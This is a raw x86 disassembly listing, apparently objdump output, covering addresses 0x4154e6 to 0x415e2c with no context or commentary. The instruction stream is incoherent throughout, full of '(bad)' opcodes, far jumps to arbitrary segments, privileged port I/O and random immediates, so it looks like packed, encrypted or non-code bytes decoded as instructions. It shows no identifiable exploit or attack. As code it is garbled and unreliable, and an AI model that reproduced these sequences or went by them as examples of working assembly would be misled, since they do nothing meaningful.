  4154e6:	mov    esp,0xa709e9ed
  4154eb:	sbb    ebp,edx
  4154ed:	xchg   ecx,eax
  4154ee:	test   al,0xac
	...
  415504:	repz xor bh,BYTE PTR [edx+0x1e]
  415508:	fldcw  WORD PTR [ebx-0x50]
  41550b:	jmp    0x91a1:0xdba04b15
  415512:	test   eax,0xb3b05079
  415517:	add    ah,al
  415519:	cdq    
  41551a:	cwde   
  41551b:	outs   dx,DWORD PTR ds:[esi]
  41551c:	xchg   esp,eax
  41551d:	dec    ebp
  41551e:	and    ebp,DWORD PTR [eax]
  415520:	js     0x4154b5
  415522:	fild   WORD PTR [ebx]
  415524:	mov    WORD PTR [edi],cs
  415526:	outs   dx,BYTE PTR ds:[esi]
  415527:	jbe    0x41558d
  415529:	cdq    
  41552a:	sub    al,0x70
  41552c:	mov    al,0x9
  41552e:	mov    bl,0x27
  415530:	mov    esp,0x4a78b1c4
  415535:	ins    BYTE PTR es:[edi],dx
  415536:	jge    0x41552f
  415538:	jno    0x41558f
  41553a:	jp     0x415508
  41553c:	adc    eax,0x800d08d0
  415541:	rcr    DWORD PTR [eax+0x62],0x1a
  415545:	ins    BYTE PTR es:[edi],dx
  415546:	jne    0x415564
  415548:	popa   
  415549:	push   edi
  41554a:	xor    DWORD PTR [ecx+0x49],eax
  41554d:	or     DWORD PTR [edx],ecx
  41554f:	jmp    0x8073:0x8d89948f
  415556:	or     dh,dh
  415558:	or     bl,BYTE PTR [edi+0xa]
  41555b:	jmp    0xeb3468ef
  415560:	and    BYTE PTR [edi],al
  415562:	fsub   st(1),st
  415564:	(bad)  
  415565:	xchg   esp,eax
  415566:	xor    DWORD PTR ds:0x0,0x0
	...
  41557c:	fs mov ah,0x81
  41557f:	xor    eax,0x6f81bcb4
  415584:	fwait
  415585:	nop
  415586:	or     cl,ch
  415588:	or     al,0x15
  41558a:	repz sbb BYTE PTR ds:0xd1b0952,cl
  415591:	push   esp
  415592:	or     DWORD PTR [ecx],ebx
  415594:	arpl   ax,cx
  415596:	sub    al,0xed
  415598:	ds or  eax,esi
  41559b:	xchg   ecx,eax
  41559c:	es pop esp
  41559e:	cmc    
  41559f:	sahf   
  4155a0:	inc    esp
  4155a1:	shr    BYTE PTR [ecx+ebx*8],1
  4155a4:	inc    esp
  4155a5:	shr    BYTE PTR [edx*8-0x2ed347cc],0x64
  4155ad:	push   ebx
  4155ae:	pop    edx
  4155af:	jb     0x41559a
  4155b1:	ret    
  4155b2:	je     0x415580
  4155b4:	(bad)  
  4155b5:	scas   eax,DWORD PTR es:[edi]
  4155b6:	sti    
  4155b7:	outs   dx,BYTE PTR ds:[esi]
  4155b8:	test   al,0xc0
  4155ba:	pop    ecx
  4155bb:	jb     0x41558e
  4155bd:	or     al,0x4c
  4155bf:	add    eax,0x5c1d3cac
  4155c4:	jo     0x415618
  4155c6:	sbb    DWORD PTR [ebp+0x2178b3],0xe2871ea4
  4155d0:	jbe    0x415567
  4155d2:	retf   0xad8b
  4155d5:	push   esi
  4155d6:	std    
  4155d7:	add    cl,dh
  4155d9:	mov    bl,0xe0
  4155db:	push   DWORD PTR [ecx+0x40]
  4155de:	repz push ebp
	...
  4155f4:	push   es
  4155f5:	int    0xc6
  4155f7:	mov    ecx,esi
  4155f9:	jnp    0x41561f
  4155fb:	call   0x34a197
  415600:	mov    esi,0x51447f0f
  415605:	jl     0x415626
  415607:	enter  0xf36,0xb0
  41560b:	jmp    0xf76822d7
  415610:	cmp    al,0x6a
  415612:	repnz mov edi,DWORD PTR [edi]
  415615:	pop    edx
  415616:	in     eax,dx
  415617:	pop    ds
  415618:	not    BYTE PTR [ecx]
  41561a:	jg     0x415660
  41561c:	xchg   ecx,eax
  41561d:	test   BYTE PTR [edi],al
  41561f:	enter  0x718e,0x71
  415623:	or     BYTE PTR [edx],dh
  415625:	aad    0x2c
  415627:	adc    al,0xf4
  415629:	xchg   edi,eax
  41562a:	or     BYTE PTR [eax],al
  41562c:	jo     0x41566d
  41562e:	jle    0x415658
  415630:	out    dx,al
  415631:	push   esp
  415632:	je     0x415658
  415634:	ds in  al,0x2c
  415637:	xor    BYTE PTR [ebp+0xdce7fea],al
  41563d:	or     bh,ah
  41563f:	dec    DWORD PTR [edx]
  415641:	aam    0xd0
  415643:	mov    esi,DWORD PTR [ecx+0x74]
  415646:	and    BYTE PTR [ebp-0x7b],dl
  415649:	rol    esi,cl
  41564b:	call   0x349a97
  415650:	outs   dx,BYTE PTR ds:[esi]
  415651:	pusha  
  415652:	add    ecx,DWORD PTR [eax+edx*4+0x89a]
	...
  415669:	add    BYTE PTR [eax],al
  41566b:	add    BYTE PTR [esi+edi*4+0x3da02460],cl
  415672:	repnz adc BYTE PTR [esi+0x1700093f],0x31
  41567a:	adc    eax,0xf18a0958
  41567f:	and    edi,0x3c
  415682:	or     DWORD PTR [eax],eax
  415684:	(bad)  
  415686:	or     ecx,DWORD PTR ds:0xc0d12
  41568c:	mov    WORD PTR [esi-0x491fdba8],?
  415692:	mov    cl,0x29
  415694:	inc    edi
  415695:	enter  0xa08,0x67
  415699:	jp     0x415715
  41569b:	add    dl,BYTE PTR [edi]
  41569d:	sbb    BYTE PTR [ecx+ecx*4-0x30],0x59
  4156a2:	add    eax,0x5c8e3329
  4156a7:	mov    ebx,DWORD PTR [eax-0x67]
  4156aa:	and    BYTE PTR [edi+0x17],cl
  4156ad:	sti    
  4156ae:	jae    0x41570c
  4156b0:	mov    al,0x99
  4156b2:	aam    0xcc
  4156b4:	sti    
  4156b5:	pop    ecx
  4156b6:	loop   0x4156ef
  4156b8:	push   0x98723899
  4156bd:	mov    dh,0x45
  4156bf:	and    al,0x9c
  4156c1:	stos   BYTE PTR es:[edi],al
  4156c2:	pop    esi
  4156c3:	mov    edx,eax
  4156c5:	and    al,0x20
  4156c7:	hlt    
  4156c8:	retf   
  4156c9:	xor    DWORD PTR [esi-0x28],esi
  4156cc:	pop    ss
  4156cd:	sub    DWORD PTR [eax],0x38
	...
  4156e3:	add    BYTE PTR [ebx-0x73],ah
  4156e6:	jne    0x4156b6
  4156e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156e9:	push   0xffffffe5
  4156eb:	std    
  4156ec:	stos   DWORD PTR es:[edi],eax
  4156ed:	push   ebp
  4156ee:	into   
  4156ef:	mov    DWORD PTR [eax+0x61],eax
  4156f2:	add    eax,0x3db67c7e
  4156f7:	and    al,0x5c
  4156f9:	xchg   esp,eax
  4156fa:	jp     0x41574b
  4156fc:	mov    al,0x88
  4156fe:	js     0x415737
  415700:	test   al,0x8c
  415702:	push   0x6a90b04f
  415707:	aas    
  415708:	test   al,0xa4
  41570a:	xchg   esi,eax
  41570b:	push   esi
  41570c:	mov    esp,0xa9db251d
  415711:	inc    ebx
  415712:	ds jmp 0xe3b9:0x2c0be105
  41571a:	jp     0x4156d5
  41571c:	adc    eax,0x3dec176d
  415721:	push   edx
  415722:	push   ds
  415723:	cs dec ebp
  415725:	mov    ds:0x948ca254,al
  41572a:	fistp  QWORD PTR [esi-0x38]
  41572d:	js     0x415706
  41572f:	add    bh,BYTE PTR cs:[ecx-0x1d]
  415733:	add    ecx,DWORD PTR [edi+eax*8+0x78b87e97]
  41573a:	repz jl 0x41578d
  41573d:	js     0x41572e
  41573f:	push   eax
  415740:	pop    esi
  415741:	in     al,0x6a
  415743:	mov    edx,0xe9cf46e4
	...
  41575c:	icebp  
  41575d:	out    0x12,eax
  41575f:	jge    0x41573b
  415761:	sbb    ebp,DWORD PTR [ebx]
  415763:	and    BYTE PTR [eax-0x260a5ac4],dh
  415769:	push   ecx
  41576a:	push   0x38
  41576c:	test   al,0x78
  41576e:	loop   0x41572b
  415770:	adc    eax,0xb463c66
  415775:	loope  0x41573a
  415777:	sbb    ebx,DWORD PTR [esi+0x1d]
  41577a:	xchg   ebp,eax
  41577b:	fdiv   st(4),st
  41577d:	inc    ebp
  41577e:	mov    gs,ecx
  415780:	adc    eax,0x68407a6d
  415785:	mov    WORD PTR [eax],cs
  415787:	push   ds
  415788:	inc    eax
  415789:	sbb    eax,esi
  41578b:	sub    edi,0x966f543
  415791:	shr    DWORD PTR [ecx*1-0x527e9377],0x9b
  415799:	js     0x4157cc
  41579b:	sub    dh,cl
  41579d:	lock sub al,0xa1
  4157a0:	cmc    
  4157a1:	fabs   
  4157a3:	in     eax,0xe0
  4157a5:	lock sub al,0x91
  4157a8:	fcomp  st(0)
  4157aa:	sub    al,0xf1
  4157ac:	mov    al,ds:0x8fed2c1a
  4157b1:	xchg   esp,eax
  4157b2:	jnp    0x4157a4
  4157b4:	or     BYTE PTR [edx],dl
  4157b6:	and    ch,ch
  4157b8:	(bad)  
  4157b9:	xchg   esp,eax
  4157ba:	or     BYTE PTR [ebp-0x13f77280],dl
	...
  4157d4:	(bad)  
  4157d5:	xchg   esp,eax
  4157d6:	je     0x4157bc
  4157d8:	or     BYTE PTR [edi+0xa],cl
  4157db:	jge    0x41584e
  4157dd:	shl    DWORD PTR [ebp+eax*8+0x67],1
  4157e1:	xchg   esp,eax
  4157e2:	jae    0x4157cd
  4157e4:	(bad)  
  4157e5:	ror    BYTE PTR [ebx],1
  4157e7:	push   0xfffffff4
  4157e9:	xchg   edx,eax
  4157ea:	jl     0x4157e6
  4157ec:	js     0x4157ce
  4157ee:	sub    al,0x11
  4157f0:	pop    ebp
  4157f1:	loope  0x415774
  4157f3:	mov    bh,0xc7
  4157f5:	popa   
  4157f6:	stc    
  4157f7:	mov    esi,0x62383af4
  4157fc:	push   ebx
  4157fd:	js     0x41584f
  4157ff:	bound  edx,QWORD PTR [ebx-0x1f8de788]
  415805:	jp     0x4157e4
  415807:	cmp    ebx,DWORD PTR [eax+0x1b]
  41580a:	mov    BYTE PTR [ecx-0x710abbde],0xa4
  415811:	xlat   BYTE PTR ds:[ebx]
  415812:	sub    al,0x0
  415814:	lds    edx,FWORD PTR [edi]
  415816:	jecxz  0x415819
  415818:	cwde   
  415819:	xor    bl,bh
  41581b:	adc    ch,BYTE PTR [esi]
  41581d:	loope  0x41584b
  41581f:	adc    BYTE PTR [eax],dh
  415821:	nop
  415822:	repz push ecx
  415824:	inc    edi
  415825:	rol    esi,1
  415827:	call   0x349c33
  41582c:	xchg   esi,eax
  41582d:	cmp    eax,0x4d66fd87
  415832:	test   BYTE PTR [ecx-0x74f76b8b],al
	...
  41584c:	jmp    0x4157ed
  41584e:	or     al,0x0
  415850:	fist   WORD PTR gs:[edi+0x50]
  415854:	out    dx,al
  415855:	or     eax,0x3ca51ee0
  41585a:	repz mov esi,ecx
  41585d:	scas   eax,DWORD PTR es:[edi]
  41585e:	and    BYTE PTR [ebp-0xc],dl
  415861:	rol    dh,1
  415863:	mov    edi,DWORD PTR [ebp+0x6b]
  415866:	clc    
  415867:	repnz xchg edx,eax
  415869:	cmp    al,0x2f
  41586b:	ret    
  41586c:	mov    ds:0x49447fab,al
  415871:	lods   al,BYTE PTR ds:[esi]
  415872:	das    
  415873:	xchg   BYTE PTR [ecx+0x50],cl
  415876:	cmc    
  415877:	jmp    FWORD PTR [eax+0x51]
  41587a:	mov    BYTE PTR [esi+0x8949d],bh
  415880:	in     eax,0xbf
  415882:	dec    ecx
  415883:	cmp    eax,0x894e5
  415888:	push   ecx
  415889:	xchg   ebp,eax
  41588a:	xchg   ebp,edi
  41588c:	idiv   DWORD PTR [edi-0x431ac2f5]
  415892:	or     BYTE PTR [eax],al
  415894:	mov    eax,ds:0xd95c7f82
  415899:	fisttp DWORD PTR [ebp-0x76603694]
  41589f:	in     eax,dx
  4158a0:	mov    WORD PTR [ecx+0x4a1a892c],?
  4158a6:	cmc    
  4158a7:	jmp    FWORD PTR [ebx-0x2d76a556]
  4158ad:	and    eax,0xf02b
	...
  4158c2:	add    BYTE PTR [eax],al
  4158c4:	fwait
  4158c5:	(bad)  
  4158c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158c7:	call   DWORD PTR [ebx+0x11ff093d]
  4158cd:	push   ecx
  4158ce:	cmc    
  4158cf:	inc    DWORD PTR [ebx-0x5fdbb75c]
  4158d5:	jo     0x4158c0
  4158d7:	mov    edx,eax
  4158d9:	inc    eax
  4158da:	out    dx,al
  4158db:	jmp    0x24821ba6
  4158e0:	(bad)
  4158e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158e5:	xor    BYTE PTR [ecx-0x77],bl
  4158e8:	inc    edx
  4158e9:	aad    0x9
  4158eb:	icebp  
  4158ec:	dec    ebx
  4158ed:	jbe    0x4158fa
  4158ef:	scas   al,BYTE PTR es:[edi]
  4158f0:	cwde   
  4158f1:	cmp    DWORD PTR [ecx],ecx
  4158f3:	add    BYTE PTR [ecx],cl
  4158f5:	or     DWORD PTR [eax],eax
  4158f7:	std    
  4158f8:	daa    
  4158f9:	pusha  
  4158fa:	jb     0x415958
  4158fc:	jo     0x4158f3
  4158fe:	xchg   ebp,edi
  415900:	cdq    
  415901:	addr16 jb 0x415950
  415904:	jo     0x41595b
  415906:	jb     0x41589e
  415908:	js     0x415943
  41590a:	or     DWORD PTR [eax],eax
  41590c:	adc    eax,0x153c28e9
  415911:	sub    DWORD PTR [eax],0x28910538
  415917:	adc    BYTE PTR [ebx+0x52],cl
  41591a:	add    eax,DWORD PTR [ebx+0x450990eb]
  415920:	idiv   DWORD PTR ds:0x41808672
  415926:	or     DWORD PTR [eax],eax
	...
  41593c:	aas    
  41593d:	lods   eax,DWORD PTR ds:[esi]
  41593e:	jno    0x41590e
  415940:	mov    ah,0x93
  415942:	push   ebp
  415943:	(bad)  
  415944:	ror    DWORD PTR [esi-0x6a],0x7d
  415948:	mov    al,ds:0xf03df98
  41594d:	dec    edi
  41594e:	(bad)  
  41594f:	jg     0x415906
  415951:	xchg   ebx,eax
  415952:	fild   WORD PTR [ebx]
  415954:	gs ror bl,1
  415957:	daa    
  415958:	mov    DWORD PTR [ecx],ebx
  41595a:	add    BYTE PTR [ebx],0x8c
  41595d:	xchg   esp,eax
  41595e:	push   0x4f
  415960:	mov    al,0xe8
  415962:	jp     0x41591a
  415964:	mov    ch,0x59
  415966:	inc    DWORD PTR fs:[ebp-0x7192d977]
  41596d:	sbb    DWORD PTR [esi],ebp
  41596f:	push   ebx
  415970:	adc    eax,0x151003d9
  415975:	cmp    bl,BYTE PTR [edx]
  415977:	xlat   BYTE PTR ds:[ebx]
  415978:	mov    edi,0xa8376ce4
  41597d:	nop
  41597e:	nop
  41597f:	jp     0x4159db
  415981:	sbb    al,0x9b
  415983:	pop    ds
  415984:	push   0x39f09d3c
  415989:	dec    esi
  41598a:	fsub   DWORD PTR [edi+0x68]
  41598d:	mov    BYTE PTR [ecx-0x3c16ead1],dl
  415993:	xor    edi,DWORD PTR [ecx+0x24b57ae2]
  415999:	ss lock in eax,0x11
  41599d:	sbb    al,BYTE PTR [edi]
  41599f:	jp     0x4159a1
	...
  4159b1:	add    BYTE PTR [eax],al
  4159b3:	add    BYTE PTR [eax+0x78],dl
  4159b6:	daa    
  4159b7:	dec    ebp
  4159b8:	pop    esp
  4159b9:	sbb    DWORD PTR [ebp-0x21bc2b24],esp
  4159bf:	in     eax,0xb5
  4159c1:	push   edi
  4159c2:	push   0x58
  4159c4:	mov    al,0xa8
  4159c6:	dec    ebp
  4159c7:	adc    al,0x15
  4159c9:	loope  0x4159d6
  4159cb:	xor    al,0x5
  4159cd:	jmp    0x15dd66da
  4159d2:	inc    esp
  4159d3:	add    eax,0xcd5c1578
  4159d8:	imul   ebx,DWORD PTR [ebx],0x4c
  4159db:	lds    ebx,FWORD PTR [edi+0x35395be7]
  4159e1:	pop    esi
  4159e2:	loopne 0x41599c
  4159e4:	ret    0xf54f
  4159e7:	jb     0x415a4d
  4159e9:	js     0x415a1b
  4159eb:	push   ss
  4159ec:	aas    
  4159ed:	sbb    eax,esi
  4159ef:	bound  esi,QWORD PTR [eax+0x7178a93c]
  4159f5:	dec    edi
  4159f6:	xor    DWORD PTR [ebx+ebp*8],ebp
  4159f9:	mov    al,BYTE PTR [ecx+0x318c9ba5]
  4159ff:	outs   dx,DWORD PTR ds:[esi]
  415a00:	lods   al,BYTE PTR ds:[esi]
  415a01:	cwde   
  415a02:	or     cl,ch
  415a04:	cli    
  415a05:	xchg   ebp,eax
  415a06:	mov    DWORD PTR [edi-0x16f76780],eax
  415a0c:	(bad)
  415a10:	(bad)  
  415a11:	xchg   ecx,eax
  415a12:	or     cl,ch
  415a14:	mov    bl,0x91
  415a16:	mov    DWORD PTR [esi],esp
	...
  415a2c:	mov    cs,eax
  415a2e:	paddusb mm1,QWORD PTR [edi-0x5416f737]
  415a35:	xchg   ecx,eax
  415a36:	mov    DWORD PTR [esi],ecx
  415a38:	(bad)  
  415a39:	enter  0x9e03,0xbf
  415a3d:	sbb    eax,esi
  415a3f:	adc    DWORD PTR ds:0x5cf6f53d,esi
  415a45:	dec    edi
  415a46:	loope  0x415a11
  415a48:	test   al,al
  415a4a:	sub    al,0xf9
  415a4c:	add    cl,BYTE PTR [ebp-0xb]
  415a4f:	jmp    0x31a75e3
  415a54:	shl    ecx,0x5b
  415a57:	bound  esp,QWORD PTR [ecx]
  415a59:	cmp    al,0xcd
  415a5b:	add    BYTE PTR [ebx+0x6645f337],bh
  415a61:	push   0xc9c874f5
  415a66:	fs and al,0xe5
  415a69:	retf   
  415a6a:	dec    esp
  415a6b:	and    al,0x81
  415a6d:	rol    DWORD PTR [eax-0x77],cl
  415a70:	jns    0x415ae6
  415a72:	push   eax
  415a73:	cmp    edi,ebp
  415a75:	inc    edi
  415a76:	xchg   DWORD PTR [edi-0x7a0cc803],esi
  415a7c:	or     cl,BYTE PTR [eax-0x77]
  415a7f:	pushf  
  415a80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415a81:	nop
  415a82:	or     BYTE PTR [ebx-0x79fc6de6],al
  415a88:	not    BYTE PTR [edi-0x7c01fff8]
  415a8e:	sub    al,0x10
	...
  415aa4:	inc    edx
  415aa5:	int    0xc7
  415aa7:	sub    esp,DWORD PTR [edx-0x7474ba19]
  415aad:	outs   dx,DWORD PTR ds:[esi]
  415aae:	and    ebp,esi
  415ab0:	retf   0x7f30
  415ab3:	push   esp
  415ab4:	xchg   ecx,eax
  415ab5:	js     0x415b12
  415ab7:	push   edx
  415ab8:	out    dx,al
  415ab9:	add    DWORD PTR [edi-0x18],edi
  415abc:	int    0x96
  415abe:	in     eax,0xff
  415ac0:	push   0x7c
  415ac2:	leave  
  415ac3:	jg     0x415ab5
  415ac5:	int3   
  415ac6:	dec    esp
  415ac7:	and    al,0x5d
  415ac9:	jge    0x415a59
  415acb:	and    al,0x31
  415acd:	cwde   
  415ace:	or     BYTE PTR [ebp+0x1c],dh
  415ad1:	adc    eax,0x983128b6
  415ad6:	or     BYTE PTR [eax],al
  415ad8:	xchg   ecx,eax
  415ad9:	lahf   
  415ada:	xor    DWORD PTR [eax],eax
  415adc:	lock xchg edi,eax
  415ade:	or     BYTE PTR [eax+esi*8+0x12],bh
  415ae2:	repz add ah,BYTE PTR [ecx+0x7c]
  415ae6:	xor    DWORD PTR [eax],eax
  415ae8:	mov    eax,fs
  415aea:	or     al,0x0
  415aec:	push   0x8ffd8e30
  415af1:	mov    esp,esi
  415af3:	push   esp
  415af4:	cmp    al,0xc6
  415af6:	(bad)  
  415af8:	inc    ebp
  415af9:	or     al,0xe9
  415afb:	std    
  415afc:	mov    bh,0x43
  415afe:	dec    eax
  415aff:	pop    ecx
  415b00:	arpl   WORD PTR [esi-0x41a5023c],di
  415b06:	sar    BYTE PTR [eax],0x0
	...
  415b19:	add    BYTE PTR [eax],al
  415b1b:	add    dh,cl
  415b1d:	inc    ebp
  415b1e:	or     DWORD PTR [ecx-0x7706aec8],ecx
  415b24:	iret   
  415b25:	retw   0x4150
  415b29:	(bad)  
  415b2a:	(bad)  
  415b2c:	jae    0x415b41
  415b2e:	jmp    0xfa002d30
  415b33:	(bad)  
  415b34:	clc    
  415b35:	loopne 0x415b1c
  415b37:	adc    BYTE PTR [edi],al
  415b39:	add    DWORD PTR ds:0xe9f60110,ebp
  415b3f:	dec    edi
  415b40:	mov    esi,0x8be8dab6
  415b45:	jecxz  0x415b30
  415b47:	std    
  415b48:	pop    es
  415b49:	or     DWORD PTR ds:0x93c1154,ebp
  415b4f:	add    BYTE PTR [esi+eax*2-0x3f928e36],cl
  415b56:	jne    0x415b58
  415b58:	mov    WORD PTR ds:0x490a8909,?
  415b5e:	or     eax,0x390e8c00
  415b63:	mov    DWORD PTR [edx-0x5b],edx
  415b66:	fucomip st,st(3)
  415b68:	sbb    ecx,DWORD PTR [edx+0xc]
  415b6b:	scas   al,BYTE PTR es:[edi]
  415b6c:	js     0x415ba7
  415b6e:	or     DWORD PTR [eax],eax
  415b70:	(bad)  
  415b71:	cwde   
  415b72:	adc    eax,0xc4947edd
  415b77:	xchg   ch,al
  415b79:	dec    edx
  415b7a:	loopne 0x415afd
  415b7c:	nop
  415b7d:	nop
  415b7e:	fild   WORD PTR [ebx]
	...
  415b94:	pop    ss
  415b95:	fucomip st,st(0)
  415b97:	pop    eax
  415b98:	jnp    0x415bb9
  415b9a:	gs repz (bad) 
  415b9d:	xchg   esp,eax
  415b9e:	fisttp WORD PTR [edx+ecx*1-0x73fc1c54]
  415ba5:	aam    0x68
  415ba7:	xchg   ecx,eax
  415ba8:	mov    al,ds:0x1303df90
  415bad:	adc    ch,bh
  415baf:	pop    es
  415bb0:	mov    WORD PTR [edx+ebp*2-0x206f7b77],ss
  415bb7:	add    edx,DWORD PTR [esi]
  415bb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415bba:	loope  0x415b71
  415bbc:	call   0xdb28:0x92f37755
  415bc3:	pop    es
  415bc4:	mov    WORD PTR [esp+edi*8-0x10eceb04],ss
  415bcb:	pop    es
  415bcc:	mov    WORD PTR [eax+edi*2-0x206f6b77],ss
  415bd3:	add    ecx,esp
  415bd5:	sbb    edx,DWORD PTR [ebp-0x1]
  415bd8:	(bad)  
  415bd9:	xchg   esp,eax
  415bda:	fisttp WORD PTR [edx+edx*1-0x73fc145b]
  415be1:	sbb    eax,0x948ffb65
  415be6:	fisttp WORD PTR [ebp-0x1ece6964]
  415bec:	dec    esi
  415bed:	sbb    eax,0xa91204ef
  415bf2:	jecxz  0x415bf7
  415bf4:	mov    WORD PTR [edi+0x8ef8],?
	...
  415c0a:	add    BYTE PTR [eax],al
  415c0c:	or     ah,BYTE PTR [ebp+0x1b8c03e3]
  415c12:	ins    DWORD PTR es:[edi],dx
  415c13:	sti    
  415c14:	(bad)  
  415c15:	xchg   esp,eax
  415c16:	or     cl,ch
  415c18:	dec    edi
  415c19:	adc    DWORD PTR [esi+0x8948bcd],eax
  415c1f:	jo     0x415c27
  415c21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415c22:	or     al,0xe9
  415c24:	(bad)  
  415c25:	sbb    ecx,DWORD PTR [esi+0x89493f1]
  415c2b:	mov    ecx,0xd98e1ba8
  415c30:	xchg   ebx,eax
  415c31:	xchg   esp,eax
  415c32:	or     BYTE PTR [edi+0x67819488],ah
  415c38:	mov    WORD PTR [eax+0x1310e908],ss
  415c3e:	adc    ch,ch
  415c40:	(bad)  
  415c41:	xchg   esp,eax
  415c42:	pop    es
  415c43:	dec    edi
  415c44:	mov    eax,0x78e90895
  415c49:	pop    ebp
  415c4a:	fcmove st,st(1)
  415c4c:	adc    cl,dl
  415c4e:	sub    al,0x25
  415c50:	adc    edx,DWORD PTR [ebp+0x7c]
  415c53:	mov    eax,0x92cd900
  415c58:	sbb    DWORD PTR [edx],esp
  415c5a:	sbb    ch,ah
  415c5c:	(bad)  
  415c5d:	xchg   esp,eax
  415c5e:	and    DWORD PTR [ebp+0x7257e4b3],edi
  415c64:	push   ds
  415c65:	mov    al,ds:0x7b8fe90c
  415c6a:	inc    esp
  415c6b:	add    eax,0x9e57e698
	...
  415c84:	ins    BYTE PTR es:[edi],dx
  415c85:	mov    DWORD PTR fs:0xbcc81658,esp
  415c8c:	fwait
  415c8d:	in     eax,dx
  415c8e:	sub    DWORD PTR [edx],0x6a56e781
  415c94:	inc    esp
  415c95:	mov    edx,cs
  415c97:	add    DWORD PTR [eax-0x6c0671e5],ecx
  415c9d:	xchg   esp,eax
  415c9e:	or     dl,al
  415ca0:	retf   
  415ca1:	jo     0x415cfb
  415ca3:	add    al,dh
  415ca5:	xchg   DWORD PTR [ebx+0x5e],edx
  415ca8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ca9:	pop    esp
  415caa:	xor    dl,al
  415cac:	fst    QWORD PTR [eax+esi*4+0x896f500]
  415cb3:	ret    
  415cb4:	jle    0x415c87
  415cb6:	sub    al,0x4
  415cb8:	jle    0x415d17
  415cba:	mov    ch,0xe9
  415cbc:	neg    BYTE PTR [ecx]
  415cbe:	dec    esp
  415cbf:	or     BYTE PTR [ebp-0x76bb80b1],dh
  415cc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415cc6:	jne    0x415cb4
  415cc8:	sbb    DWORD PTR [eax+ecx*1+0x79553800],0x24513407
  415cd3:	add    al,0xa5
  415cd5:	xchg   esp,eax
  415cd6:	(bad)  
  415cd7:	mov    esp,DWORD PTR [ecx]
  415cd9:	jno    0x415d27
  415cdb:	add    al,0xb5
  415cdd:	xchg   esp,eax
  415cde:	jg     0x415c74
  415ce0:	leave  
  415ce1:	aam    0xc
  415ce3:	add    BYTE PTR [ebp+0x8c7f85],ah
	...
  415cf9:	add    BYTE PTR [eax],al
  415cfb:	add    cl,cl
  415cfd:	aam    0xc
  415cff:	add    BYTE PTR [ebp-0x7e],dh
  415d02:	jg     0x415c98
  415d04:	dec    ecx
  415d05:	test   al,0xc
  415d07:	add    BYTE PTR [ebp-0x7d],ah
  415d0a:	pop    eax
  415d0b:	mov    ebp,ecx
  415d0d:	outs   dx,DWORD PTR ds:[esi]
  415d0e:	dec    eax
  415d0f:	add    al,0x75
  415d11:	xchg   esp,eax
  415d12:	pop    edx
  415d13:	push   eax
  415d14:	rcl    bh,0x2c
  415d17:	sbb    BYTE PTR [ebp-0x6d00067d],bh
  415d1d:	adc    cl,ah
  415d1f:	sub    al,0x39
  415d21:	xchg   esp,eax
  415d22:	or     bl,al
  415d24:	mov    eax,ds:0x81ccc457
  415d29:	push   edi
  415d2a:	(bad)  
  415d2b:	int3   
  415d2c:	popa   
  415d2d:	push   edi
  415d2e:	(bad)  
  415d2f:	int3   
  415d30:	mov    WORD PTR [eax],cs
  415d32:	and    bl,0xd
  415d35:	dec    edx
  415d36:	fiadd  DWORD PTR [eax]
  415d38:	mov    WORD PTR ds:0xc2bb563c,?
  415d3e:	or     BYTE PTR ds:[ebp+0x3fb618a2],bh
  415d45:	mov    edx,0xc48c3f4f
  415d4a:	fdivr  QWORD PTR [edi-0x49f9c50c]
  415d50:	nop
  415d51:	dec    ebp
  415d52:	test   bh,ch
  415d54:	minps  xmm1,XMMWORD PTR ds:0x3c2230d
  415d5b:	or     al,0x5a
  415d5d:	jl     0x415d6b
  415d5f:	add    DWORD PTR [eax],0x0
	...
  415d72:	add    BYTE PTR [eax],al
  415d74:	aam    0x2e
  415d76:	jo     0x415d47
  415d78:	xchg   ebx,eax
  415d79:	mov    edi,0x905088cb
  415d7e:	les    eax,FWORD PTR [ecx+0xf]
  415d81:	repz adc edi,DWORD PTR [ebp+edi*4+0x6c]
  415d86:	mov    bh,0x66
  415d88:	setns  BYTE PTR [eax]
  415d8b:	jmp    DWORD PTR [eax]
  415d8d:	inc    ebx
  415d8e:	test   al,dl
  415d90:	fwait
  415d91:	cmc    
  415d92:	xchg   esi,eax
  415d93:	dec    esp
  415d94:	mov    WORD PTR [edi-0x1e],ds
  415d97:	add    DWORD PTR [ecx],edx
  415d99:	imul   esi,edi,0x8a3cf58a
  415d9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415da0:	xor    DWORD PTR [ebp-0x2a],ecx
  415da3:	std    
  415da4:	imul   edi,DWORD PTR ds:0x4d11a48a,0xffffffd6
  415dab:	std    
  415dac:	pop    ebx
  415dad:	cmp    eax,0xbf83d91c
  415db2:	mov    dh,BYTE PTR [edx+eax*8+0x788b08fc]
  415db9:	gs mov bh,dh
  415dbc:	cwde   
  415dbd:	xchg   esp,eax
  415dbe:	lods   al,BYTE PTR ds:[esi]
  415dbf:	or     DWORD PTR [esi],eax
  415dc1:	rcr    ah,1
  415dc3:	retf   
  415dc4:	adc    al,0xd0
  415dc6:	cld    
  415dc7:	jae    0x415dfe
  415dc9:	pushf  
  415dca:	imul   ecx,DWORD PTR [eax+0x5f],0x774876f8
  415dd1:	and    al,0xa2
  415dd3:	add    BYTE PTR ds:0xbc7ba8,0x0
	...
  415dea:	add    BYTE PTR [eax],al
  415dec:	inc    ebp
  415ded:	test   al,0xdf
  415def:	add    ecx,DWORD PTR [edi+edx*4-0x41c77e6b]
  415df6:	and    BYTE PTR [edi+edx*1],al
  415df9:	xor    bh,0x82
  415dfc:	loop   0x415d89
  415dfe:	inc    esp
  415dff:	or     al,BYTE PTR [esi]
  415e01:	shl    ah,1
  415e03:	retf   
  415e04:	add    al,0xd0
  415e06:	aam    0x73
  415e08:	mov    ch,0x9b
  415e0a:	imul   eax,DWORD PTR [edi+0x7f],0x974766f8
  415e11:	and    al,0x22
  415e13:	xor    DWORD PTR [ebp+0x7bbd138b],0x6b
  415e1a:	out    dx,al
  415e1b:	xchg   ebp,eax
  415e1c:	or     eax,0x8c451d50
  415e21:	adc    al,0xb
  415e23:	or     esp,edi
  415e25:	xchg   ebx,eax
  415e26:	sti    
  415e27:	or     eax,0xff5c9115
  415e2c:	stc    
